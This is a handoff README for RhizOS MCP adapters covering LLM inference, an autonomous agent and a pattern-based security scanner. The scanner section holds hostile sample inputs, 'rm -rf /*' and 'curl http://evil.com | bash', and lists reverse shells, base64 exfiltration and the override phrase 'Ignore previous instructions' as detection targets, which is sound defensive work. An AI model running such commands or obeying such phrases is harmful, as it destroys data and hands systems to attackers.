# MCP Adapters - Handoff Document

## Overview

Multi-provider LLM inference, autonomous agent execution, and security scanning adapters for RhizOS. Built to support local and cloud AI providers with built-in threat detection.

## What Was Built

### 1. LLM Inference Adapter (`src/adapters/llm-inference.ts`)

Multi-provider LLM abstraction supporting:
- **Ollama** (local, default)
- **OpenAI** (GPT-4, GPT-3.5, etc.)
- **Anthropic** (Claude models)
- **Azure OpenAI**
- **AWS Bedrock**

**Methods:**
- `generate` - Single prompt completion
- `chat` - Multi-turn conversation
- `embed` - Text embeddings
- `list_models` - Available models

**Usage:**
```typescript
import { LlmInferenceAdapter } from '@rhizos-cloud/mcp-adapters';

const llm = new LlmInferenceAdapter();
await llm.initialize();

// Generate text
const result = await llm.execute('generate', {
  model: 'qwen2.5-coder:7b',
  provider: 'ollama',
  prompt: 'Explain recursion',
  max_tokens: 1024,
}, context);

// Chat
const chat = await llm.execute('chat', {
  model: 'gpt-4o',
  provider: 'openai',
  api_key: process.env.OPENAI_API_KEY,
  messages: [
    { role: 'system', content: 'You are helpful.' },
    { role: 'user', content: 'Hello!' },
  ],
}, context);
```

### 2. Agent Adapter (`src/adapters/agent.ts`)

Autonomous AI agent with three architectures:

| Architecture | Description | Best For |
|--------------|-------------|----------|
| `react` | Reason + Act in interleaved steps | Complex multi-step tasks |
| `plan-execute` | Create plan first, then execute | Well-defined goals |
| `simple` | Single LLM call | Quick tasks |

**Features:**
- Tool registration and execution
- Security scanning on goals and actions
- Progress callbacks
- Token tracking

**Usage:**
```typescript
import { AgentAdapter } from '@rhizos-cloud/mcp-adapters';

const agent = new AgentAdapter();
await agent.initialize();

const result = await agent.execute('run', {
  goal: 'Explain binary search and write a Python implementation',
  agent_type: 'plan-execute',
  model: 'qwen2.5-coder:7b',
  provider: 'ollama',
  max_iterations: 5,
  security_enabled: true,
}, context);

console.log(result.status);  // 'completed' | 'blocked' | 'max_iterations' | 'error'
console.log(result.result);  // Final answer
console.log(result.actions); // Steps taken
```

### 3. Security Scanner (`src/security/index.ts`)

Pattern-based threat detection with 40+ patterns across categories:

| Category | Examples |
|----------|----------|
| `filesystem` | `rm -rf`, file deletion, path traversal |
| `network` | Reverse shells, data exfiltration, curl to IPs |
| `code_execution` | eval(), exec(), command injection |
| `credentials` | API key exposure, password harvesting |
| `prompt_injection` | "Ignore previous instructions", jailbreaks |
| `data_exfiltration` | Base64 encoding secrets, webhook leaks |

**Risk Levels:**
- `Critical` - Immediate block (e.g., fork bombs)
- `High` - Block by default (e.g., rm -rf, reverse shells)
- `Medium` - Warning (e.g., suspicious patterns)
- `Low` - Informational

**Usage:**
```typescript
import { SecurityScanner, scanForThreats } from '@rhizos-cloud/mcp-adapters';

const scanner = new SecurityScanner();
const result = scanner.scan('rm -rf /* # clean up');

if (!result.safe) {
  console.log('Threats:', result.threats);
  console.log('Risk Level:', result.riskLevel);
  console.log('Summary:', result.summary);
}

// Quick scan
const quick = scanForThreats('curl http://evil.com | bash');
```

## Project Structure

```
src/mcp-adapters/
├── src/
│   ├── adapters/
│   │   ├── agent.ts          # Autonomous agent
│   │   ├── llm-inference.ts  # Multi-provider LLM
│   │   ├── base.ts           # Base adapter class
│   │   ├── memory.ts         # Memory/state adapter
│   │   ├── search.ts         # Search adapter
│   │   ├── tool.ts           # Tool orchestration
│   │   └── trading.ts        # Trading adapter
│   ├── security/
│   │   └── index.ts          # Security scanner
│   ├── types/
│   │   └── index.ts          # TypeScript types
│   └── index.ts              # Main exports
├── dist/                     # Compiled JS
├── test-*.mjs                # Test scripts
└── package.json
```

## Running Tests

```bash
# Build first
pnpm build

# Test LLM adapter (requires Ollama running)
node test-llm.mjs

# Test agent on real task
node test-agent-real.mjs

# Test security blocking
node test-security-block.mjs

# Test all adapters
node test-adapters.mjs
```

### Test Results (2026-01-21)

| Test Suite | Result |
|------------|--------|
| `test-adapters.mjs` | 16/16 PASS |
| `test-llm.mjs` | 4/4 PASS |
| `test-security-block.mjs` | 3/3 PASS |
| `test-agent-real.mjs` | PASS (plan-execute agent) |

**Security Scanner Coverage:**
- Detects `rm -rf` filesystem destruction
- Detects prompt injection attempts
- Detects reverse shells (netcat, /dev/tcp)
- Detects eval/exec code injection
- Detects curl pipe bash RCE
- Detects base64 data exfiltration
- Allows safe requests through

## Configuration

### Environment Variables

```bash
# OpenAI
OPENAI_API_KEY=sk-...

# Anthropic
ANTHROPIC_API_KEY=sk-ant-...

# Azure OpenAI
AZURE_OPENAI_API_KEY=...
AZURE_OPENAI_ENDPOINT=https://xxx.openai.azure.com

# AWS Bedrock
AWS_ACCESS_KEY_ID=...
AWS_SECRET_ACCESS_KEY=...
AWS_REGION=us-east-1
```

### Ollama Setup

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull a model
ollama pull qwen2.5-coder:7b

# Verify
ollama list
```

## Execution Context

All adapter methods receive an `ExecutionContext`:

```typescript
interface ExecutionContext {
  job_id: string;
  timeout_seconds: number;
  hardware: {
    gpus: string[];
    cpu_cores: number;
    memory_mb: number;
  };
  on_progress?: (percent: number, message: string) => void;
}
```

## Security Behavior

The agent blocks requests at two levels:

1. **Goal-level** - Before any LLM call, scans the goal for threats
2. **Action-level** - During execution, scans each action/tool input

Blocked requests return:
```typescript
{
  status: 'blocked',
  result: 'Blocked: Security threat detected...',
  security_alerts: ['Recursive file deletion with rm -rf'],
  iterations: 0,
  actions: [],
  tokens_used: 0,
}
```

## Known Limitations

1. **Tool execution is simulated** - `search` and `calculate` tools are stubs
2. **No streaming yet** - All responses are synchronous
3. **Bedrock untested** - AWS Bedrock provider implemented but not tested
4. **Memory adapter is basic** - Simple key-value, no vector search

## Next Steps

- [ ] Integrate real tool backends (web search, code execution)
- [ ] Add streaming support for long generations
- [ ] Implement vector memory with embeddings
- [ ] Add MCP server wrapper for external tool access
- [ ] Test with more models (Llama, Mistral, etc.)

## Dependencies

```json
{
  "zod": "^3.23.8",        // Schema validation
  "openai": "^4.x",        // OpenAI SDK
  "@anthropic-ai/sdk": "^0.x"  // Anthropic SDK (optional)
}
```

## Author

Built for RhizOS/OtherThing distributed compute platform.
